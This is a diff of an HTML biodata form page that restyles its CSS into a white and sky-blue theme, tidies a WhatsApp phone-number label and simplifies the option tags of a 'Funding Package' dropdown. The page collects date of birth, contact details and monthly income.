@@ -5,6 +5,7 @@
 <title>Biodata Form</title>
 
 <style>
+/* 🌫️ White background */
 body {
 margin:0;
 font-family: Arial, sans-serif;
@@ -12,74 +13,85 @@ height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-background: linear-gradient(-45deg, #ff4d4d, #4d79ff, #4dff88, #ffcc00);
-background-size: 400% 400%;
-animation: bg 10s ease infinite;
+background:#ffffff;
 }
 
-@keyframes bg {
-0% {background-position:0% 50%;}
-50% {background-position:100% 50%;}
-100% {background-position:0% 50%;}
+/* ✨ soft glow background */
+body::before {
+content:"";
+position:absolute;
+width:100%;
+height:100%;
+background: radial-gradient(circle at top left, #e6f7ff, transparent 60%),
+            radial-gradient(circle at bottom right, #e6f0ff, transparent 60%);
+z-index:-1;
 }
 
+/* 📦 Sky blue form */
 form {
-background:#fff;
+background: linear-gradient(135deg, #87ceeb, #b0e0ff);
 padding:25px;
 border-radius:15px;
 width:90%;
 max-width:450px;
-box-shadow:0 10px 30px rgba(0,0,0,0.2);
+box-shadow:0 10px 30px rgba(0,0,0,0.15);
 }
 
 h2 {
 text-align:center;
 margin-bottom:15px;
+color:#003366;
 }
 
+/* 🏷️ Labels */
 label {
 font-size:13px;
 font-weight:bold;
-color:#333;
+color:#003366;
 margin-top:8px;
 display:block;
 }
 
+/* ✍️ Inputs */
 input, select {
 width:100%;
 padding:10px;
 margin-top:5px;
 margin-bottom:10px;
-border:1px solid #ddd;
+border:1px solid #cce6ff;
 border-radius:8px;
 outline:none;
+background:#f8fcff;
 }
 
 input:focus {
-border-color:#4d79ff;
-box-shadow:0 0 5px rgba(77,121,255,0.5);
+border-color:#3399ff;
+box-shadow:0 0 5px rgba(51,153,255,0.5);
 }
 
+/* 🔘 Button */
 button {
 width:100%;
 padding:12px;
-background:#4d79ff;
+background:#007acc;
 border:none;
 color:#fff;
 font-size:16px;
 border-radius:8px;
 cursor:pointer;
+transition:0.3s;
 }
 
 button:hover {
-background:#2f5bff;
+background:#005fa3;
 transform: scale(1.02);
 }
 
+/* 📝 Note */
 .note {
 font-size:12px;
 text-align:center;
-color:#666;
+color:#003366;
 margin-top:10px;
 }
 </style>
@@ -99,7 +111,7 @@ margin-top:10px;
 <label>Date of Birth</label>
 <input type="date" id="dob" required>
 
-<label>Phone Number[ set up WhatsApp account]</label>
+<label>Phone Number [set up WhatsApp account]</label>
 <input type="tel" id="phone" placeholder="Enter your phone number" required>
 
 <label>Email Address</label>
@@ -111,14 +123,13 @@ margin-top:10px;
 <label>Monthly Income</label>
 <input type="text" id="income" placeholder="Enter your monthly income">
 
-<!-- 🟢 UPDATED PACKAGES -->
 <label>Funding Package</label>
 <select id="package">
-<option value="Youth Empowerment">Youth Empowerment</option>
-<option value="Educational Support">Educational Support</option>
-<option value="Personal Relief Fund">Personal Relief Fund</option>
-<option value="Agriculture">Agriculture</option>
-<option value="Business Development Funds">Business Development Funds</option>
+<option>Youth Empowerment</option>
+<option>Educational Support</option>
+<option>Personal Relief Fund</option>
+<option>Agriculture</option>
+<option>Business Development Funds</option>
 </select>
 
 <label>Gender</label>
